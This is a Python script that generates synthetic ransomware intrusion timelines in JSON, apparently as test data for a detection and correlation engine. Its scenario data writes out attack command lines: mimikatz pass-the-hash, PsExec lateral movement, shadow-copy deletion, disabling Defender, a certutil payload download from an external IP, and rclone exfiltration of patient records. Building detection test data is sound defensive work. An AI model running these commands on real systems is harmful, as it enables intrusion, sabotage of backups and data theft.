"""
EdgeShield: Multi-Stage Correlated Intrusion Scenarios Generator
Creates synchronized multi-stage attack datasets combining Lateral Movement (LSA)
and downstream Ransomware / Impact stages (BPD) across simulated enterprise hosts.
"""

import os
import json
import time
import pandas as pd
from typing import Dict, List, Any

def generate_multi_stage_scenarios(output_json: str = "data/multi_stage_scenarios.json") -> List[Dict[str, Any]]:
    """
    Generates realistic, synchronized multi-step intrusion timelines for testing the EdgeShield
    dual-stream correlation engine.
    """
    os.makedirs(os.path.dirname(output_json), exist_ok=True)
    
    scenarios = [
        {
            "scenario_id": "SCENARIO_01_BLACKCAT_CAMPAIGN",
            "name": "Coordinated ALPHV/BlackCat Ransomware Campaign",
            "target_enterprise": "CorpActiveDirectory.local",
            "stages": [
                {
                    "stage_index": 1,
                    "stream": "LSA",
                    "source_host": "WORKSTATION-08",
                    "target_host": "FILE-SRV-01",
                    "user": "CORP\\Administrator",
                    "event_payload": {
                        "EventID": "4624",
                        "LogonType": "9",
                        "Image": "C:\\Windows\\System32\\mimikatz.exe",
                        "CommandLine": "mimikatz.exe sekurlsa::pth /user:Administrator /domain:CORP /ntlm:e52cac67419a9a224a3b108f3fa6cb6d",
                        "SourceIp": "192.168.1.108",
                        "DestinationIp": "192.168.1.15",
                        "DestinationPort": "445"
                    },
                    "expected_technique": "T1550.002",
                    "description": "Adversary injects stolen NTLM hash into memory for Pass-the-Hash lateral movement."
                },
                {
                    "stage_index": 2,
                    "stream": "LSA",
                    "source_host": "FILE-SRV-01",
                    "target_host": "DC-PRIMARY",
                    "user": "CORP\\DomainAdmin",
                    "event_payload": {
                        "EventID": "1",
                        "Image": "C:\\Windows\\System32\\psexec.exe",
                        "CommandLine": "psexec.exe \\\\192.168.1.10 -u CORP\\DomainAdmin -p [REDACTED] cmd.exe /c start-service PSEXESVC",
                        "SourceIp": "192.168.1.15",
                        "DestinationIp": "192.168.1.10",
                        "DestinationPort": "445"
                    },
                    "expected_technique": "T1021.002",
                    "description": "PsExec execution pivoting from file server to Domain Controller."
                },
                {
                    "stage_index": 3,
                    "stream": "BPD",
                    "source_host": "DC-PRIMARY",
                    "target_host": "DC-PRIMARY",
                    "user": "CORP\\DomainAdmin",
                    "event_payload": {
                        "EventType": "PROCESS",
                        "CommandLine": "vssadmin.exe delete shadows /all /quiet",
                        "TargetPath": "C:\\Windows\\System32\\vssadmin.exe",
                        "ApiCall": "CreateProcessW",
                        "Entropy": 4.8,
                        "ExtensionChange": "None"
                    },
                    "expected_technique": "T1490",
                    "description": "Volume shadow copies deleted to prevent enterprise disaster recovery."
                },
                {
                    "stage_index": 4,
                    "stream": "BPD",
                    "source_host": "DC-PRIMARY",
                    "target_host": "DC-PRIMARY",
                    "user": "CORP\\DomainAdmin",
                    "event_payload": {
                        "EventType": "PROCESS",
                        "CommandLine": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true",
                        "TargetPath": "powershell.exe",
                        "ApiCall": "OpenServiceW",
                        "Entropy": 5.1,
                        "ExtensionChange": "None"
                    },
                    "expected_technique": "T1562.001",
                    "description": "Defender real-time monitoring disabled before ransomware binary payload launch."
                },
                {
                    "stage_index": 5,
                    "stream": "BPD",
                    "source_host": "DC-PRIMARY",
                    "target_host": "DC-PRIMARY",
                    "user": "CORP\\DomainAdmin",
                    "event_payload": {
                        "EventType": "FILE_SYSTEM",
                        "CommandLine": "rundll32.exe encrypt_core.dll,LockSystem",
                        "TargetPath": "C:\\EnterpriseData\\Financial_Ledger_2026.xlsx.locked",
                        "ApiCall": "CryptEncrypt",
                        "Entropy": 7.95,
                        "ExtensionChange": ".locked"
                    },
                    "expected_technique": "T1486",
                    "description": "Mass encryption begins. Threat score maxes out, requiring emergency host isolation."
                }
            ]
        },
        {
            "scenario_id": "SCENARIO_02_LOCKBIT_WMI_WINRM",
            "name": "LockBit 3.0 WMI & WinRM Staged Intrusion",
            "target_enterprise": "HealthNetRegional.org",
            "stages": [
                {
                    "stage_index": 1,
                    "stream": "LSA",
                    "source_host": "CLINIC-PC-04",
                    "target_host": "EHR-APP-SRV",
                    "user": "HEALTH\\svc_ehr",
                    "event_payload": {
                        "EventID": "4624",
                        "LogonType": "3",
                        "Image": "C:\\Windows\\System32\\wmic.exe",
                        "CommandLine": "wmic.exe /node:10.20.4.50 process call create \"cmd.exe /c certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\\Temp\\svchost.exe\"",
                        "SourceIp": "10.20.4.14",
                        "DestinationIp": "10.20.4.50",
                        "DestinationPort": "135"
                    },
                    "expected_technique": "T1047",
                    "description": "WMI remote process call executed to drop stage-2 loader on Electronic Health Record server."
                },
                {
                    "stage_index": 2,
                    "stream": "BPD",
                    "source_host": "EHR-APP-SRV",
                    "target_host": "EHR-APP-SRV",
                    "user": "HEALTH\\svc_ehr",
                    "event_payload": {
                        "EventType": "PROCESS",
                        "CommandLine": "wmic.exe shadowcopy delete /nointeractive",
                        "TargetPath": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                        "ApiCall": "CreateProcessW",
                        "Entropy": 4.6,
                        "ExtensionChange": "None"
                    },
                    "expected_technique": "T1490",
                    "description": "WMI shadowcopy deletion executed to sabotage EHR backups."
                },
                {
                    "stage_index": 3,
                    "stream": "BPD",
                    "source_host": "EHR-APP-SRV",
                    "target_host": "EHR-APP-SRV",
                    "user": "HEALTH\\svc_ehr",
                    "event_payload": {
                        "EventType": "NETWORK",
                        "CommandLine": "rclone.exe copy D:\\PatientData remote:185.220.101.5/health_exfil",
                        "TargetPath": "D:\\PatientData\\Records_2026.zip",
                        "ApiCall": "InternetConnectW",
                        "Entropy": 7.4,
                        "ExtensionChange": "None",
                        "DestinationIp": "185.220.101.5",
                        "DestinationPort": "443"
                    },
                    "expected_technique": "T1071.001",
                    "description": "Double-extortion pre-encryption exfiltration of patient records."
                }
            ]
        }
    ]

    with open(output_json, "w", encoding="utf-8") as f:
        json.dump(scenarios, f, indent=2)
        
    print(f"[+] Multi-stage attack scenarios saved to: {output_json}")
    return scenarios

if __name__ == "__main__":
    generate_multi_stage_scenarios()
